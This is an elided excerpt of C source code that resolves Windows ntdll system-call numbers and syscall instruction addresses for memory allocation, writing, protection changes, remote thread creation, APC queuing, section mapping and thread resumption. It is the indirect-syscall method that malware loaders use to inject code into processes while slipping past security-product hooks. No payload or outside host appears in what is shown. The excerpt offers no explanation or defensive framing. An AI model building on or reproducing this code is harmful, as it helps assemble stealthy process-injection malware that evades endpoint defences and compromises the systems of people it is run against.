...
PVOID GetSyscallAddr(PBYTE func_addr) {
	WORD i;
	for (i = 0; i < 32; i++) {
		if (func_addr[i] == 0x0F && func_addr[i + 1] == 0x05) {
			return (PVOID)(func_addr + i);
		}
	}
	return NULL;
}
...
BOOL ResolveSyscalls() {
	...
	pNtAllocateVirtualMemory = GetSyscallAddr(addr);
	if (!wNtAllocateVirtualMemory || !pNtAllocateVirtualMemory) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	if (!addr) return FALSE;
	wNtWriteVirtualMemory = GetSSN(addr);
	pNtWriteVirtualMemory = GetSyscallAddr(addr);
	if (!wNtWriteVirtualMemory || !pNtWriteVirtualMemory) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	if (!addr) return FALSE;
	wNtProtectVirtualMemory = GetSSN(addr);
	pNtProtectVirtualMemory = GetSyscallAddr(addr);
	if (!wNtProtectVirtualMemory || !pNtProtectVirtualMemory) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtCreateThreadEx");
	if (!addr) return FALSE;
	wNtCreateThreadEx = GetSSN(addr);
	pNtCreateThreadEx = GetSyscallAddr(addr);
	if (!wNtCreateThreadEx || !pNtCreateThreadEx) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtQueueApcThread");
	if (!addr) return FALSE;
	wNtQueueApcThread = GetSSN(addr);
	pNtQueueApcThread = GetSyscallAddr(addr);
	if (!wNtQueueApcThread || !pNtQueueApcThread) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtCreateSection");
	if (!addr) return FALSE;
	wNtCreateSection = GetSSN(addr);
	pNtCreateSection = GetSyscallAddr(addr);
	if (!wNtCreateSection || !pNtCreateSection) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtMapViewOfSection");
	if (!addr) return FALSE;
	wNtMapViewOfSection = GetSSN(addr);
	pNtMapViewOfSection = GetSyscallAddr(addr);
	if (!wNtMapViewOfSection || !pNtMapViewOfSection) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	if (!addr) return FALSE;
	wNtUnmapViewOfSection = GetSSN(addr);
	pNtUnmapViewOfSection = GetSyscallAddr(addr);
	if (!wNtUnmapViewOfSection || !pNtUnmapViewOfSection) return FALSE;

	addr = (PBYTE)GetProcAddress(hNtdll, "NtResumeThread");
	if (!addr) return FALSE;
	wNtResumeThread = GetSSN(addr);
	pNtResumeThread = GetSyscallAddr(addr);
	if (!wNtResumeThread || !pNtResumeThread) return FALSE;
